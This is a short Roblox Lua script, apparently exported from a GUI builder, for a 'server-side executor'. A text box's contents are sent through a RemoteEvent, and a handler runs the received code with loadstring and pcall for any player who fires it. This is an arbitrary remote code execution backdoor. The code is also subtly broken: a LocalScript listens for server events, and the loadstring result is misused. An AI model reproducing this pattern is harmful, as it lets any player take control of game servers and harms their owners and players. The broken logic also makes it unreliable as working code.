local function EFDXLFN_fake_script() -- Execute_2.LocalScript 
	local script = Instance.new('LocalScript', Execute_2)

	local textBox = script.Parent.Parent.ServerCoder 
	local executeButton = script.Parent.Parent.Execute
	
	executeButton.MouseButton1Click:Connect(function()
		local code = textBox.Text
		game.ReplicatedStorage.RemoteEvent:FireServer(code)
	end)
	
	game.ReplicatedStorage.RemoteEvent.OnServerEvent:Connect(function(player, code)
		local fn, err = loadstring("return function() "..code.." end")()
		if fn then
			pcall(fn)
		else
			warn("Ошибка загрузки кода:", err)
		end
	end)
	
end
coroutine.wrap(EFDXLFN_fake_script)()
